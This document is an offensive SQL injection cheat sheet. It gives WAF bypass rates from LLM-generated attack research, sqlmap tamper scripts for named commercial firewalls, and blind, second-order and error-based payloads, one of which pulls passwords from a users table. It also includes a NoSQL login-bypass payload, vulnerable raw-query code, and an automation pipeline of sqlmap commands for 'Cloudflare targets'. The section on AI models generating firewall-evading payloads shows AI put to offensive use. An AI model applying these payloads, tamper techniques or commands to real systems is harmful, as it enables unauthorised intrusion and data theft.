# SQL Injection: 2026 Complete Reference

## Modern WAF Bypass (2026 Research)

LLM-based adversarial SQLi generation achieves 22-50% WAF bypass rates:

- **RADAGAS** (Retrieval-Augmented Generation for Adversarial SQLi): RAG + LLM (GPT-4o, Claude 3.7, DeepSeek R1) with multi-stage diversity and execution filtering. Average bypass rate: 22.73%
- **RefleXQLi** (Reflective Chain-of-Thought SQLi): 4-step CoT reasoning (WAF Analysis, Strategy Formulation, Payload Design, Refinement) + dual-LLM validation. 21.21% bypass, 100% payload uniqueness
- **GenSQLi**: 16.26% on ModSecurity PL1 (rule-based WAFs)

### WAF-Specific Bypass Rates (RADAGAS-GPT4o)
- **Cloudflare**: 49.50%
- **AWS WAF**: 33.00%
- **WAF-Brain** (ML): 92.49%
- **ModSecurity PL1**: 5.70%

### Tamper Script Framework (sqlmap-tamper-collection v2.1.0)
Context-aware SQL transformation with:
- Token-based framework with UUID tracking
- AST-based hierarchical structure
- Context-aware transformations (clause state, nesting depth)

| WAF | Tamper | Key Techniques |
|-----|--------|----------------|
| Cloudflare | cloudflare2025.py | Version comments, case, space |
| AWS WAF | awswaf2026.py | Hex encoding, logical swaps |
| Azure WAF | azurewaf2026.py | Hex strings, comment chaos |
| ModSecurity CRS | modsec_crs2026.py | Case, math numbers |
| Imperva | imperva2026.py | Homoglyphs, function wrap |
| Akamai Kona | akamai2026.py | Float numbers |

### Transformation Modules (v2.1.0+)
- Keyword wrap (MySQL version comments)
- Space replacement (`/**/`)
- Case alternation (`sElEcT`)
- Value encoding (URL encode WHERE/HAVING operators)
- Homoglyph substitution
- Function wrapping (IF/CASE)
- Numeric obfuscation (hex/float/math)
- Comment chaos (varied styles)
- Logical operator swap (AND/OR → &&/||)
- Hex string encoding

## Blind SQL Injection

### Time-Based Detection
PostgreSQL: `'; SELECT pg_sleep(5)--`
MySQL: `' OR SLEEP(5)--`
MSSQL: `'; WAITFOR DELAY '0:0:5'--`

### Boolean-Based Detection
- `' OR '1'='1` vs `' OR '1'='2`
- Use `SUBSTRING`/`ASCII` functions for character-by-character extraction
- Automate with sqlmap: `sqlmap -r request.txt --technique=B --level 3`

## Second-Order SQLi
- Payload stored in one request (profile name, address field)
- Executed when another feature loads and queries the stored value
- Harder to detect — stored value survives sanitization of direct injection points
- Test: `'+(SELECT @@version)+'` stored in name field, viewed in admin panel

## ORM Injection

### Type-Based Bypass
ORM type coercion fails when parameter types don't match expected. Example (Mongoose):
```javascript
User.find({ username: req.body.username, password: req.body.password })
// JSON payload: {"username": "admin", "password": {"$ne": ""}}
```

### Sequelize (SQL ORM)
```javascript
// Raw query in Sequelize — same as SQLi
sequelize.query(`SELECT * FROM users WHERE name = '${req.body.name}'`)
```

## XML-Based Injection
SQL/XML functions in Oracle: `EXTRACTVALUE`, `UPDATEXML`
Generate errors that leak data: `AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))`

## Automation Pipeline
1. Use sqlmap with WAF-specific tamper scripts
2. For Cloudflare targets: `sqlmap --tamper=cloudflare2025.py`
3. For blind: `--technique=B --time-sec=3 --level 5`
4. For second-order: `--second-order /other-endpoint`